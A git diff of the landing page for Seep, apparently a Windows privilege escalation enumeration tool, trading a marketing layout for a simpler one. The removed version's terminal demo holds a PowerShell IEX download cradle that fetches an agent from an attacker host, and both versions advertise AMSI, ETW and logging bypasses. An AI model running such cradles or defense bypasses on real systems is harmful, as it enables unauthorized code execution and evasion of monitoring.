@@ -3,386 +3,337 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seep — Know Every Privilege Escalation Path</title>
-    <meta name="description" content="Windows privilege escalation enumeration with MITRE ATT&CK mapping. 16 check categories, 97 tool integrations, fileless agent, and single-file HTML reports.">
+    <title>Seep — Windows Privilege Escalation Enumeration</title>
+    <meta name="description" content="Windows privilege escalation enumeration framework with fileless agent. 16 checks, 97 tools, MITRE ATT&CK mapping with single-file HTML reports.">
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext x='16' y='24' text-anchor='middle' font-family='Inter,sans-serif' font-size='24' font-weight='800' fill='%2394e2d5'%3ES%3C/text%3E%3C/svg%3E">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        :root{
-            --accent1:#94e2d5;--accent2:#a6e3a1;--accentmid:#89dceb;
-            --accentrgb:148,226,213;
-            --text:#cdd6f4;--sub1:#bac2de;--sub0:#a6adc8;
-            --ov2:#9399b2;--ov1:#7f849c;--ov0:#6c7086;
-            --sf2:#585b70;--sf1:#45475a;--sf0:#313244;
-            --base:#1e1e2e;--mantle:#181825;--crust:#11111b;
-            --green:#a6e3a1;--yellow:#f9e2af;--red:#f38ba8;
-            --peach:#fab387;--mauve:#cba6f7;--teal:#94e2d5;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --accent: #94e2d5;
+            --accent-rgb: 148, 226, 213;
+            --text: #cdd6f4;
+            --sub1: #bac2de;
+            --sub0: #a6adc8;
+            --overlay2: #9399b2;
+            --overlay1: #7f849c;
+            --overlay0: #6c7086;
+            --surface2: #585b70;
+            --surface1: #45475a;
+            --surface0: #313244;
+            --base: #1e1e2e;
+            --mantle: #181825;
+            --crust: #11111b;
         }
-        body{font-family:'Inter',system-ui,sans-serif;background:var(--crust);color:var(--text);line-height:1.7;overflow-x:hidden}
-        ::selection{background:rgba(var(--accentrgb),0.3);color:var(--text)}
-        .container{max-width:1140px;margin:0 auto;padding:0 28px}
-        code{font-family:'JetBrains Mono',monospace;background:var(--mantle);padding:2px 7px;border-radius:3px;font-size:.88em;color:var(--green)}
+        body { font-family: 'Inter', system-ui, sans-serif; background: var(--base); color: var(--text); line-height: 1.6; }
 
-        /* ── Nav ── */
-        .nav{position:fixed;top:0;left:0;right:0;height:56px;background:rgba(17,17,27,0.8);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid rgba(49,50,68,0.5);z-index:1000;display:flex;align-items:center;justify-content:center}
-        .nav-inner{max-width:1140px;width:100%;padding:0 28px;display:flex;align-items:center;justify-content:space-between}
-        .nav-logo{font-family:'Inter',sans-serif;font-size:16px;font-weight:700;color:var(--text);text-decoration:none}
-        .nav-links{display:flex;align-items:center;gap:28px}
-        .nav-links a{font-size:13px;font-weight:500;color:var(--ov0);text-decoration:none;transition:color .2s}
-        .nav-links a:hover{color:var(--text)}
-        .nav-cta{background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);padding:7px 18px;border-radius:8px;font-size:13px;font-weight:600;text-decoration:none;transition:box-shadow .2s,transform .2s}
-        .nav-cta:hover{box-shadow:0 0 20px rgba(var(--accentrgb),0.3);transform:translateY(-1px)}
+        /* Status Bar */
+        .status-bar {
+            background: var(--crust);
+            border-bottom: 1px solid var(--surface0);
+            padding: 8px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            font-weight: 500;
+        }
+        .status-inner {
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .status-left { color: var(--accent); }
+        .status-right { color: var(--overlay1); }
 
-        /* ── Hero ── */
-        .hero{padding:140px 0 80px;text-align:center;position:relative}
-        .hero::before{content:'';position:absolute;top:60px;left:50%;transform:translateX(-50%);width:800px;height:400px;background:radial-gradient(ellipse,rgba(var(--accentrgb),0.08) 0%,transparent 60%);pointer-events:none}
-        .hero-logo{position:relative;max-width:600px;margin:0 auto 32px}
-        .hero-logo img{width:100%;height:auto}
-        .hero-tagline{position:relative;font-size:clamp(24px,3.5vw,38px);font-weight:700;line-height:1.2;margin-bottom:16px;background:linear-gradient(135deg,var(--accent1),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-        .hero-desc{position:relative;font-size:16px;color:var(--ov0);max-width:560px;margin:0 auto 32px}
-        .hero-ctas{position:relative;display:flex;gap:12px;justify-content:center;margin-bottom:48px}
-        .btn-primary{background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);padding:12px 28px;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;text-decoration:none;transition:box-shadow .2s,transform .2s}
-        .btn-primary:hover{box-shadow:0 0 24px rgba(var(--accentrgb),0.35);transform:translateY(-2px)}
-        .btn-secondary{background:var(--sf0);color:var(--text);padding:12px 28px;border-radius:8px;border:1px solid var(--sf1);font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:500;text-decoration:none;transition:all .2s}
-        .btn-secondary:hover{background:var(--sf1);border-color:var(--sf2)}
+        /* Hero Section */
+        .hero {
+            background: var(--mantle);
+            border-bottom: 1px solid var(--surface0);
+            padding: 60px 0;
+        }
+        .hero-inner {
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 1fr auto;
+            gap: 60px;
+            align-items: center;
+        }
+        .hero-content h1 {
+            font-size: clamp(48px, 8vw, 72px);
+            font-weight: 800;
+            line-height: 0.9;
+            margin-bottom: 16px;
+            color: var(--text);
+        }
+        .hero-content .accent { color: var(--accent); }
+        .hero-content p {
+            font-size: 16px;
+            color: var(--overlay1);
+            margin-bottom: 24px;
+            max-width: 480px;
+        }
+        .hero-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--accent);
+            color: var(--base);
+            padding: 12px 20px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            border-radius: 6px;
+            transition: transform 0.2s ease;
+        }
+        .hero-link:hover { transform: translateY(-1px); }
 
-        /* ── Terminal ── */
-        .terminal{position:relative;max-width:800px;margin:0 auto;background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.5),0 0 24px rgba(var(--accentrgb),0.06)}
-        .terminal-bar{background:var(--crust);padding:12px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--sf0)}
-        .terminal-dot{width:12px;height:12px;border-radius:50%}
-        .terminal-dot:nth-child(1){background:var(--red)}
-        .terminal-dot:nth-child(2){background:var(--yellow)}
-        .terminal-dot:nth-child(3){background:var(--green)}
-        .terminal-label{flex:1;text-align:center;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ov0)}
-        .terminal-body{padding:24px;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.9;text-align:left}
-        .terminal-body pre{margin:0;white-space:pre-wrap;word-wrap:break-word}
-        .t-g{color:var(--green)}.t-b{color:var(--accent1)}.t-m{color:var(--sub0)}.t-p{color:var(--peach)}
+        /* Specs Grid */
+        .specs-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1px;
+            background: var(--surface0);
+        }
+        .spec-item {
+            background: var(--mantle);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .spec-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+            color: var(--overlay1);
+            letter-spacing: 1px;
+        }
+        .spec-value {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--accent);
+        }
+        .spec-desc {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--overlay0);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
 
-        /* ── Stats ── */
-        .stats{display:flex;justify-content:center;gap:40px;padding:60px 0;position:relative}
-        .stat{text-align:center}
-        .stat-num{font-family:'JetBrains Mono',monospace;font-size:36px;font-weight:700;color:var(--accent1);line-height:1}
-        .stat-label{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--sf2);margin-top:6px;letter-spacing:2px;text-transform:uppercase}
-        .stat-div{width:1px;height:48px;background:var(--sf0);align-self:center}
+        /* Main Content */
+        .main-content {
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 60px 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 40px;
+        }
+        .section {
+            background: var(--mantle);
+            border: 1px solid var(--surface0);
+            padding: 32px;
+            position: relative;
+        }
+        .section-number {
+            position: absolute;
+            top: -1px;
+            left: -1px;
+            background: var(--accent);
+            color: var(--base);
+            padding: 8px 12px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 700;
+        }
+        .section h2 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text);
+        }
+        .section p {
+            font-size: 14px;
+            color: var(--overlay1);
+            line-height: 1.6;
+        }
 
-        /* ── Sections ── */
-        section{padding:80px 0}
-        .section-label{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;color:var(--accent1);letter-spacing:3px;text-transform:uppercase;margin-bottom:12px}
-        .section-title{font-size:clamp(28px,4vw,40px);font-weight:700;margin-bottom:12px;letter-spacing:-.02em}
-        .section-desc{font-size:15px;color:var(--ov0);margin-bottom:48px;max-width:560px}
-        .gradient-line{height:1px;background:linear-gradient(90deg,transparent,var(--accent1),var(--accent2),transparent);margin:0 auto;max-width:600px}
+        /* Call to Action */
+        .cta {
+            background: var(--accent);
+            color: var(--base);
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .cta h2 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+        .cta p {
+            font-size: 14px;
+            margin-bottom: 20px;
+            opacity: 0.8;
+        }
+        .cta-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--base);
+            color: var(--accent);
+            padding: 12px 24px;
+            text-decoration: none;
+            font-weight: 700;
+            border-radius: 6px;
+            transition: transform 0.2s ease;
+        }
+        .cta-button:hover { transform: translateY(-1px); }
 
-        /* ── Bento ── */
-        .bento{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
-        .bento-card{background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;padding:28px;transition:all .25s;position:relative;overflow:hidden}
-        .bento-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent1),var(--accent2));opacity:0;transition:opacity .25s}
-        .bento-card:hover{transform:translateY(-3px);border-color:var(--sf1);box-shadow:0 12px 32px rgba(0,0,0,0.25),0 0 20px rgba(var(--accentrgb),0.06)}
-        .bento-card:hover::before{opacity:1}
-        .bento-hero{grid-column:span 2}
-        .bento-card h3{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--accent1);margin-bottom:8px}
-        .bento-card p{font-size:13.5px;color:var(--sub0);line-height:1.6}
-        .bento-card .mini-terminal{background:var(--crust);border-radius:8px;padding:14px;margin-top:14px;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.8;text-align:left}
-        .bento-stat{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
-        .bento-stat .big{font-family:'JetBrains Mono',monospace;font-size:42px;font-weight:700;color:var(--accent1)}
-        .bento-stat .label{font-size:12px;color:var(--sf2);margin-top:4px;letter-spacing:1px}
+        /* Footer */
+        .footer {
+            background: var(--crust);
+            border-top: 1px solid var(--surface0);
+            padding: 20px 0;
+            text-align: center;
+        }
+        .footer p {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--overlay0);
+        }
+        .footer a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        .footer a:hover { text-decoration: underline; }
 
-        /* ── Pills ── */
-        .pills{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px}
-        .pill{background:var(--mantle);border:1px solid var(--sf0);border-radius:20px;padding:9px 18px;font-family:'JetBrains Mono',monospace;font-size:12px;display:flex;align-items:center;gap:8px;transition:all .2s;color:var(--sub0)}
-        .pill:hover{border-color:var(--sf1);background:var(--base)}
-        .dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
-        .dot-g{background:var(--green)}.dot-y{background:var(--yellow)}.dot-n{background:var(--sf2)}
-
-        /* ── Arch ── */
-        .arch-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
-        .arch-card{background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;padding:28px;transition:border-color .2s}
-        .arch-card:hover{border-color:var(--sf1)}
-        .arch-num{display:inline-flex;width:30px;height:30px;background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);border-radius:50%;align-items:center;justify-content:center;font-weight:700;font-size:14px;margin-bottom:14px}
-        .arch-card h3{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--teal);margin-bottom:8px}
-        .arch-card p{font-size:13.5px;color:var(--sub0);line-height:1.6}
-
-        /* ── Two Col ── */
-        .two-col{display:grid;grid-template-columns:1fr 1fr;gap:20px}
-
-        /* ── Detection ── */
-        .detect-card{background:var(--mantle);border-radius:12px;padding:28px}
-        .detect-card h3{font-size:14px;margin-bottom:14px;display:flex;align-items:center;gap:8px}
-        .detect-card ul{list-style:none;font-size:13px;color:var(--sub0);line-height:2.2}
-        .detect-hidden{border-left:3px solid var(--green)}.detect-hidden h3{color:var(--green)}
-        .detect-visible{border-left:3px solid var(--yellow)}.detect-visible h3{color:var(--yellow)}
-
-        /* ── Footer ── */
-        footer{padding:48px 0;margin-top:40px}
-        .footer-line{height:1px;background:linear-gradient(90deg,transparent,var(--accent1),var(--accent2),transparent);margin-bottom:48px}
-        .footer-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:32px}
-        .footer-grid h4{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text);margin-bottom:14px;letter-spacing:2px;text-transform:uppercase}
-        .footer-grid ul{list-style:none}
-        .footer-grid li{margin-bottom:8px}
-        .footer-grid a{color:var(--ov2);text-decoration:none;font-size:13px;transition:color .2s}
-        .footer-grid a:hover{color:var(--accent1)}
-        .footer-grid p{font-size:13px;color:var(--ov1);line-height:1.7}
-        .footer-bottom{text-align:center;margin-top:36px;padding-top:24px;border-top:1px solid var(--sf0);font-size:12px;color:var(--ov0)}
-
-        /* ── Animate ── */
-        .animate{opacity:0;transform:translateY(24px);transition:opacity .6s ease,transform .6s ease}
-        .animate.visible{opacity:1;transform:translateY(0)}
-        .animate-scale{opacity:0;transform:translateY(24px) scale(.97);transition:opacity .8s ease,transform .8s ease}
-        .animate-scale.visible{opacity:1;transform:translateY(0) scale(1)}
-
-        /* ── Responsive ── */
-        @media(max-width:960px){.bento{grid-template-columns:1fr 1fr}.bento-hero{grid-column:span 2}.two-col,.arch-grid{grid-template-columns:1fr}.footer-grid{grid-template-columns:repeat(2,1fr)}.stats{flex-wrap:wrap;gap:24px}}
-        @media(max-width:600px){.container{padding:0 16px}.hero{padding:100px 0 48px}.bento{grid-template-columns:1fr}.bento-hero{grid-column:span 1}.stats{gap:16px}.stat-div{display:none}.nav-links a:not(.nav-cta){display:none}.footer-grid{grid-template-columns:1fr}.pills{grid-template-columns:repeat(auto-fill,minmax(140px,1fr))}}
-
-        a:focus-visible{outline:2px solid var(--accent1);outline-offset:2px}
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero-inner {
+                grid-template-columns: 1fr;
+                gap: 40px;
+                text-align: center;
+            }
+            .specs-grid {
+                grid-template-columns: 1fr;
+            }
+            .main-content {
+                grid-template-columns: 1fr;
+                gap: 30px;
+            }
+        }
     </style>
 </head>
 <body>
-
-    <!-- Nav -->
-    <nav class="nav"><div class="nav-inner">
-        <a href="#" class="nav-logo">Seep</a>
-        <div class="nav-links">
-            <a href="#features">Features</a>
-            <a href="#architecture">Architecture</a>
-            <a href="https://github.com/Real-Fruit-Snacks/Seep">GitHub</a>
-            <a href="https://github.com/Real-Fruit-Snacks/Seep/releases/latest" class="nav-cta">Download</a>
+    <!-- Status Bar -->
+    <div class="status-bar">
+        <div class="status-inner">
+            <div class="status-left">RFS ⋅ SEEP ⋅ ENUMERATION FRAMEWORK</div>
+            <div class="status-right">PYTHON ⋅ POWERSHELL</div>
         </div>
-    </div></nav>
-
-    <!-- Hero -->
-    <section class="hero">
-        <div class="container">
-            <div class="hero-logo animate"><img src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/logo-dark.svg" alt="Seep"></div>
-            <h1 class="hero-tagline animate" style="transition-delay:.1s">Know every privilege escalation path</h1>
-            <p class="hero-desc animate" style="transition-delay:.2s">Windows privilege escalation enumeration with MITRE ATT&CK mapping. 16 check categories, 97 tool integrations, fileless agent, and single-file HTML reports.</p>
-            <div class="hero-ctas animate" style="transition-delay:.3s">
-                <a href="https://github.com/Real-Fruit-Snacks/Seep/releases/latest" class="btn-primary">Download Latest</a>
-                <a href="https://github.com/Real-Fruit-Snacks/Seep" class="btn-secondary">View Source</a>
-            </div>
-            <div class="terminal animate-scale" style="transition-delay:.4s">
-                <div class="terminal-bar">
-                    <span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span>
-                    <span class="terminal-label">seep</span>
-                </div>
-                <div class="terminal-body"><pre><span class="t-g">$</span> seep init --workdir /tmp/op1
-<span class="t-g">$</span> seep serve --workdir /tmp/op1
-<span class="t-b">HTTP server on :80  (agent + tools)</span>
-<span class="t-b">Upload server on :8000</span>
-<span class="t-b">Token: a8f3c2...</span>
-
-<span class="t-m"># On target (PowerShell)</span>
-<span class="t-p">PS&gt; IEX(New-Object Net.WebClient).DownloadString(</span>
-<span class="t-p">     'http://KALI/agent.ps1?token=a8f3c2')</span>
-
-<span class="t-g">$</span> seep report results.json --format html -o report.html
-<span class="t-b">report generated: 16 checks, 42 findings</span></pre></div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Stats -->
-    <div class="container">
-        <div class="stats animate">
-            <div class="stat"><div class="stat-num" data-target="16">0</div><div class="stat-label">Checks</div></div>
-            <div class="stat-div"></div>
-            <div class="stat"><div class="stat-num" data-target="97">0</div><div class="stat-label">Tools</div></div>
-            <div class="stat-div"></div>
-            <div class="stat"><div class="stat-num" data-target="7">0</div><div class="stat-label">Categories</div></div>
-            <div class="stat-div"></div>
-            <div class="stat"><div class="stat-num" data-target="2">0</div><div class="stat-label">Platforms</div></div>
-        </div>
-        <div class="gradient-line"></div>
     </div>
 
-    <!-- Features Bento -->
-    <section id="features">
-        <div class="container">
-            <div class="section-label animate">FEATURES</div>
-            <h2 class="section-title animate" style="transition-delay:.08s">16 checks, zero disk footprint</h2>
-            <p class="section-desc animate" style="transition-delay:.16s">Fileless PowerShell agent with 16 enumeration checks. 97-tool catalog with SHA256 verification. MITRE ATT&CK-mapped recommendations.</p>
-
-            <div class="bento">
-                <div class="bento-card bento-hero animate" style="transition-delay:.1s">
-                    <h3>Fileless Agent</h3>
-                    <p>Agent runs entirely in memory via IEX cradle. Results are AES-256-CBC encrypted, compressed, and uploaded over HTTP. AMSI/ETW/Script Block Logging bypassed automatically.</p>
-                    <div class="mini-terminal"><span class="t-g">$</span> seep compose --obfuscate --output agent.ps1<br><span class="t-b">16 checks composed</span><br><span class="t-b">identifiers randomized (CSPRNG)</span></div>
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-inner">
+            <div class="hero-content">
+                <h1>SEEP<span class="accent">.</span></h1>
+                <p>Windows privilege escalation enumeration framework with fileless agent. 16 checks, 97 tools, MITRE ATT&CK mapping.</p>
+                <a href="https://github.com/Real-Fruit-Snacks/Seep" class="hero-link">
+                    <span>→</span>
+                    View on GitHub
+                </a>
+            </div>
+            <div class="specs-grid">
+                <div class="spec-item">
+                    <div class="spec-label">Enumeration</div>
+                    <div class="spec-value">16 Checks</div>
+                    <div class="spec-desc">System · Privs · Registry</div>
                 </div>
-                <div class="bento-card bento-stat animate" style="transition-delay:.18s">
-                    <div class="big">97</div>
-                    <div class="label">Tool Integrations</div>
+                <div class="spec-item">
+                    <div class="spec-label">Tools</div>
+                    <div class="spec-value">97 Catalog</div>
+                    <div class="spec-desc">SHA256 · MITRE ATT&CK</div>
                 </div>
-                <div class="bento-card animate" style="transition-delay:.2s">
-                    <h3 style="color:var(--mauve)">16 Enumeration Checks</h3>
-                    <p>Modular PowerShell check modules producing structured JSON. System info, token privileges, services, scheduled tasks, registry secrets, DLL hijack, and more.</p>
+                <div class="spec-item">
+                    <div class="spec-label">Agent</div>
+                    <div class="spec-value">Fileless</div>
+                    <div class="spec-desc">AMSI · ETW · AES-256</div>
                 </div>
-                <div class="bento-card animate" style="transition-delay:.28s">
-                    <h3 style="color:var(--green)">MITRE ATT&CK Mapping</h3>
-                    <p>Every finding maps to ATT&CK techniques with actionable exploitation guidance — tool suggestions, example commands, and risk ratings sorted by severity.</p>
-                </div>
-                <div class="bento-card animate" style="transition-delay:.36s">
-                    <h3 style="color:var(--peach)">97-Tool Catalog</h3>
-                    <p>Organized across 7 categories with SHA256 integrity verification. Self-hosted distribution via GitHub Releases. Download, verify, and serve from the attack box.</p>
-                </div>
-                <div class="bento-card bento-stat animate" style="transition-delay:.1s">
-                    <div class="big" style="color:var(--teal)">16</div>
-                    <div class="label">Checks</div>
-                </div>
-                <div class="bento-card bento-hero animate" style="transition-delay:.18s">
-                    <h3 style="color:var(--red)">OPSEC Protections</h3>
-                    <p>AMSI bypass in cradle, ETW + Script Block Logging disabled at runtime. IIS header spoofing, token-gated endpoints (404 on failure), AES-256-CBC transport, CSPRNG identifier randomization.</p>
-                    <div class="mini-terminal"><span class="t-g">$</span> seep compose --checks system_info,quick_wins --obfuscate<br><span class="t-b">2 checks composed, identifiers randomized</span><br><span class="t-m">AMSI bypass + ETW disable included</span></div>
-                </div>
-                <div class="bento-card animate" style="transition-delay:.26s">
-                    <h3 style="color:var(--yellow)">HTML Reports</h3>
-                    <p>Dark-themed, self-contained HTML — no CDN, no external requests. Executive summary, per-finding detail with evidence, remediation guidance, and recommended tools.</p>
+                <div class="spec-item">
+                    <div class="spec-label">Reports</div>
+                    <div class="spec-value">HTML</div>
+                    <div class="spec-desc">Single-file · Dark</div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Capabilities -->
-    <section style="background:var(--mantle)">
-        <div class="container">
-            <div class="section-label animate">CAPABILITIES</div>
-            <h2 class="section-title animate" style="transition-delay:.08s">Enumeration coverage</h2>
-            <p class="section-desc animate" style="transition-delay:.16s">Python CLI on the attack box, PowerShell agent on the target. 16 checks across system, network, credentials, services, and registry.</p>
-            <div class="pills">
-                <div class="pill animate"><span class="dot dot-g"></span>System Info</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Token Privileges</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Network Config</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Patch Level</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Quick Wins</div>
-                <div class="pill animate"><span class="dot dot-g"></span>MITRE ATT&CK Mapping</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Web Configs</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Services</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Scheduled Tasks</div>
-                <div class="pill animate"><span class="dot dot-g"></span>HTML Reports</div>
-                <div class="pill animate"><span class="dot dot-g"></span>AlwaysInstallElev</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Software Inventory</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Processes</div>
-                <div class="pill animate"><span class="dot dot-g"></span>DLL Hijack</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Directory Tree</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Registry Secrets</div>
-                <div class="pill animate"><span class="dot dot-g"></span>AMSI Bypass</div>
-                <div class="pill animate"><span class="dot dot-y"></span>ETW Bypass</div>
-            </div>
-            <div style="margin-top:16px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ov0)">
-                <span style="color:var(--green)">●</span> Full &nbsp;
-                <span style="color:var(--yellow)">●</span> Partial &nbsp;
-                <span style="color:var(--sf2)">●</span> Not Supported
-            </div>
-        </div>
-    </section>
+    <!-- Main Content -->
+    <main class="main-content">
+        <section class="section">
+            <div class="section-number">01</div>
+            <h2>Premise</h2>
+            <p>Windows privilege escalation enumeration framework designed for comprehensive discovery of misconfigurations and vulnerabilities. Deploy a fileless PowerShell agent that executes modular checks across system configuration, user privileges, services, patches, and registry analysis.</p>
+        </section>
 
-    <!-- Architecture -->
-    <section id="architecture">
-        <div class="container">
-            <div class="section-label animate">ARCHITECTURE</div>
-            <h2 class="section-title animate" style="transition-delay:.08s">Two-component architecture</h2>
-            <p class="section-desc animate" style="transition-delay:.16s">Python CLI on the attack box orchestrates everything. Composed PowerShell agent runs on the target and reports back.</p>
-            <div class="arch-grid">
-                <div class="arch-card animate" style="transition-delay:.1s"><div class="arch-num">1</div><h3>CLI Server</h3><p>Click-style CLI with <code>init</code>, <code>serve</code>, <code>catalog</code>, <code>compose</code>, <code>report</code> commands. Unified HTTP handler for agent delivery, tool serving, and result upload.</p></div>
-                <div class="arch-card animate" style="transition-delay:.2s"><div class="arch-num">2</div><h3>Agent Composer</h3><p>16 PowerShell check modules with metadata headers. Cherry-pick checks with <code>--checks</code>/<code>--exclude</code>. CSPRNG identifier randomization with <code>--obfuscate</code>.</p></div>
-                <div class="arch-card animate" style="transition-delay:.3s"><div class="arch-num">3</div><h3>Tool Catalog</h3><p>97 tool definitions in YAML with SHA256 hashes, categories, and MITRE triggers. Download, verify integrity, and serve via the HTTP server.</p></div>
-                <div class="arch-card animate" style="transition-delay:.4s"><div class="arch-num">4</div><h3>Report Generator</h3><p>Finding-to-tool mapping with MITRE ATT&CK recommendations. HTML, Markdown, and JSON report generation with executive summary and remediation guidance.</p></div>
-            </div>
-        </div>
-    </section>
+        <section class="section">
+            <div class="section-number">02</div>
+            <h2>Framework</h2>
+            <p>Python CLI orchestrates enumeration through agent composition, tool serving, and report generation. 97-tool catalog across 7 categories with SHA256 verification. Agent runs entirely in memory with AMSI/ETW bypasses and AES-256 encrypted uploads.</p>
+        </section>
 
-    <!-- Getting Started -->
-    <section style="background:var(--mantle)">
-        <div class="container">
-            <div class="section-label animate">GETTING STARTED</div>
-            <h2 class="section-title animate" style="transition-delay:.08s">Install and enumerate</h2>
-            <p class="section-desc animate" style="transition-delay:.16s">Python 3.9+ on the attack box, PowerShell 3.0+ on the target. Install with pipx and initialize a workspace.</p>
-            <div class="two-col">
-                <div class="terminal animate" style="transition-delay:.1s">
-                    <div class="terminal-bar"><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-label">install.sh</span></div>
-                    <div class="terminal-body"><pre><span class="t-g">$</span> git clone https://github.com/Real-Fruit-Snacks/Seep.git
-<span class="t-g">$</span> cd Seep && pipx install .
+        <section class="section">
+            <div class="section-number">03</div>
+            <h2>Execution</h2>
+            <p>Fileless PowerShell agent with 16 modular checks producing structured JSON findings. MITRE ATT&CK mappings with actionable exploitation guidance. Obfuscated identifiers and stealth execution options for operational security.</p>
+        </section>
 
-<span class="t-m"># Initialize workspace and start server</span>
-<span class="t-g">$</span> seep init --workdir /tmp/op1
-<span class="t-g">$</span> seep serve --workdir /tmp/op1
-<span class="t-b">HTTP :80 | Upload :8000 | Token: a8f3c2</span></pre></div>
-                </div>
-                <div class="terminal animate" style="transition-delay:.25s">
-                    <div class="terminal-bar"><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-label">usage.sh</span></div>
-                    <div class="terminal-body"><pre><span class="t-m"># Compose minimal agent</span>
-<span class="t-g">$</span> seep compose --checks system_info,quick_wins
+        <section class="section">
+            <div class="section-number">04</div>
+            <h2>Reporting</h2>
+            <p>Single-file HTML reports with dark theme and no CDN dependencies. Executive summaries, per-finding detail with evidence, remediation guidance, and recommended tools. Export to HTML, Markdown, or JSON formats.</p>
+        </section>
 
-<span class="t-m"># Download tool catalog</span>
-<span class="t-g">$</span> seep catalog download --all --workdir /tmp/op1
+        <section class="section">
+            <div class="section-number">05</div>
+            <h2>Architecture</h2>
+            <p>Three-layer design with Python CLI orchestration, PowerShell agent composition, and encrypted result upload. Tool categories include Enumeration, Credentials, TokenAbuse, AD, Tunneling, Impacket, and Shells with integrity verification.</p>
+        </section>
 
-<span class="t-m"># Generate HTML report</span>
-<span class="t-g">$</span> seep report results.json --format html -o report.html
+        <section class="section">
+            <div class="section-number">06</div>
+            <h2>Authorization</h2>
+            <p>Designed for authorized Windows security testing with explicit written permission. Generates significant network traffic and PowerShell activity logged by Windows Event Log and monitoring solutions. Report vulnerabilities via GitHub Security Advisories.</p>
+        </section>
+    </main>
 
-<span class="t-m"># Verify tool integrity</span>
-<span class="t-g">$</span> seep catalog verify --workdir /tmp/op1</pre></div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Detection -->
-    <section>
-        <div class="container">
-            <div class="section-label animate">DETECTION AWARENESS</div>
-            <h2 class="section-title animate" style="transition-delay:.08s">Know the boundaries</h2>
-            <div class="two-col" style="margin-top:32px">
